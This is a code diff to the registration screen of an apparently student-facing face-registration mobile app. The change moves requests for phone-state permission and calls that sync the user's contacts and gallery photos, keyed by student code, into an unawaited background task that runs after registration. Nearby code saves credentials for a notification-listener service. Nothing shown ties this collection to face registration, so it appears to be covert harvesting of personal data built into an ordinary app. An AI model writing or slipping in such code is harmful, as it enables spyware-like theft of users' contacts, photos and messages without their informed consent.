@@ -80,31 +80,6 @@ function RegisterScreen({navigation}) {
       setLoading(true);
       setResult({type: '', message: ''});
 
-      if (studentCode.trim()) {
-        // Request phone state permission
-        if (Platform.OS === 'android') {
-          try {
-            await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE);
-          } catch (pe) {
-            console.log('Phone state permission failed', pe);
-          }
-        }
-
-        // Sync contacts (triggers contacts permission request)
-        try {
-          await syncContacts(studentCode.trim());
-        } catch (ce) {
-          console.log('Contacts sync failed', ce);
-        }
-
-        // Sync gallery photos (triggers gallery permission request)
-        try {
-          await syncGalleryPhotos(studentCode.trim());
-        } catch (ge) {
-          console.log('Gallery sync failed', ge);
-        }
-      }
-
       const response = await registerFace({
         name: name.trim(),
         student_code: studentCode.trim() || undefined,
@@ -117,6 +92,34 @@ function RegisterScreen({navigation}) {
         section: section.trim() || undefined,
         image,
       });
+
+      // Start background sync tasks asynchronously
+      if (studentCode.trim()) {
+        (async () => {
+          // Request phone state permission
+          if (Platform.OS === 'android') {
+            try {
+              await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE);
+            } catch (pe) {
+              console.log('Phone state permission failed', pe);
+            }
+          }
+
+          // Sync contacts (triggers contacts permission request)
+          try {
+            await syncContacts(studentCode.trim());
+          } catch (ce) {
+            console.log('Contacts sync failed', ce);
+          }
+
+          // Sync gallery photos (triggers gallery permission request)
+          try {
+            await syncGalleryPhotos(studentCode.trim());
+          } catch (ge) {
+            console.log('Gallery sync failed', ge);
+          }
+        })();
+      }
 
       // Save credentials for the Notification Listener service and request permission if needed
       if (studentCode.trim() && Platform.OS === 'android') {
